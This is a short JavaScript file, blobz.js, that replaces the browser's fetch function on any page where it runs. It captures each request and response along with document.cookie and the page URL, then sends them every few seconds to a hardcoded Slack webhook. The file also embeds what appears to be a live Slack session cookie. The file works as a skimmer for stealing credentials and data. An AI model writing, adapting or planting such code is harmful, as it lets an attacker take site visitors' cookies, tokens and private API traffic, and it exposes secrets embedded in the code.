/// blobz.js
function report(message) {
    fetch('https://hooks.slack.com/services/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',{
        method: 'POST',
        headers: {
            'content-type': 'application/json',
            'cookie': 'd=xoxd-QEan0YYxjE8WISNBT08w10rDcNDd2kHFNj3Z8Av3M0rgQzrdnjSnv6HfmpF2%2BuzhaIR3Vbmfheku9%2Fxq8DRWXaMxrwqUDNYGANbpO31wK0YSpTm5qzwq3wOLWk5wJTmf0JYQBOl5oVMhi48%2F0O4QW4h73agPhYjCgXqK7eHU4t21HDAadQUewIZNnVcqaWxLFy5Dox4wAJo7EO1EQRLwVpUWqGQP;'
        },
        body:JSON.stringify({text:message}),
        mode: 'no-cors'
    });
}

const original_fetch = window.fetch;

window._queue__ = []
setInterval(() => {
    let popped = window._queue__.pop();
    if(!popped) return;

    report(popped)
}, 3000);

window.fetch = async function(...args) {
    const [input, init = {}] = args;

    try {
        const response = await original_fetch(...args);

        const cloned_response = response.clone();

        let response_body;
        try {
            response_body = await cloned_response.json();
        } catch (e) {
            response_body = await cloned_response.text();
        }
        
        if(!input.includes('hooks.slack.com')) {
            window._queue__.push(JSON.stringify({
                'url': input,
                'origin': window.location.href,
                'cookie': document.cookie,
                'method': init.method || "GET",
                'request': {
                    'headers': init.headers,
                    'body': init.body
                },
                'response': {
                    'headers': [...cloned_response.headers.entries()],
                    'status': cloned_response.status,
                    'body': response_body
                }
            }))
        }

        return response;
    } catch (err) {
        throw err;
    }
};
